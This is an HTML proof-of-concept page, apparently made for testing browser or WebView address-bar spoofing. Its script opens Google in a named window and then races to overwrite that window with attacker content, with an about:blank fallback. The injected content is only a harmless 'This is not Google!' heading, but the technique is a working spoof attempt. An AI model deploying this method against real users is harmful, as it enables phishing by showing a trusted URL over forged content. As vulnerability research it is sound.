<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>PoC — Address Bar Race (TEST ONLY)</title>
  <style>
    html,body{height:100%;margin:0;display:flex;align-items:center;justify-content:center;background:#fff}
    h1{font-family:system-ui,Segoe UI,Roboto,Arial;font-size:28px;color:#111}
  </style>
</head>
<body>
  <!-- Visible attacker content -->
  <h1>This is not Google!</h1>

<script>
/*
  PoC (best-effort):
  1) try to open named window 'x' to https://www.google.com/
  2) after a short delay, attempt to replace the content in that same window with attacker content
     (document.write on the window we opened). Many browsers block this for cross-origin navigations,
     but some WebView implementations / timing windows may allow the race that leads to address-bar mismatch.
  3) fallback: try about:blank flow (open about:blank, write attacker content, then navigate to google).
  NOTE: behavior depends on target WebView; run only in your test environment.
*/

(function runPoC(){
  const target = 'https://www.google.com/';
  const attackerUrl = location.href; // our page
  const openDelay = 300; // ms — adjust when testing
  try {
    // Attempt 1: open google in named window then reuse name 'x' to inject afterwards
    const w = window.open(target, 'x'); // requires popup permission / user gesture in many browsers
    if (!w) return; // popup blocked or not allowed
    setTimeout(() => {
      try {
        // Attempt to write attacker content into the same named window.
        // This will throw if the navigation to google already committed or cross-origin protections apply.
        w.document.open();
        w.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
        w.document.close();
      } catch (e) {
        // If blocked, try about:blank flow as a fallback (some WebViews behave differently)
        try {
          const w2 = window.open('about:blank', 'x');
          if (!w2) return;
          w2.document.open();
          w2.document.write('<!doctype html><meta charset="utf-8"><title>Not Google</title><style>body{font-family:system-ui;padding:32px}</style><h1>This is not Google!</h1>');
          w2.document.close();
          // then navigate to target (this creates the race in some engines)
          setTimeout(() => {
            try { w2.location.href = target; } catch(e2) { /* ignore */ }
          }, 50);
        } catch(_) { /* ignore */ }
      }
    }, openDelay);
  } catch (err) {
    // silent fail — PoC best-effort
  }
})();
</script>
</body>
</html>
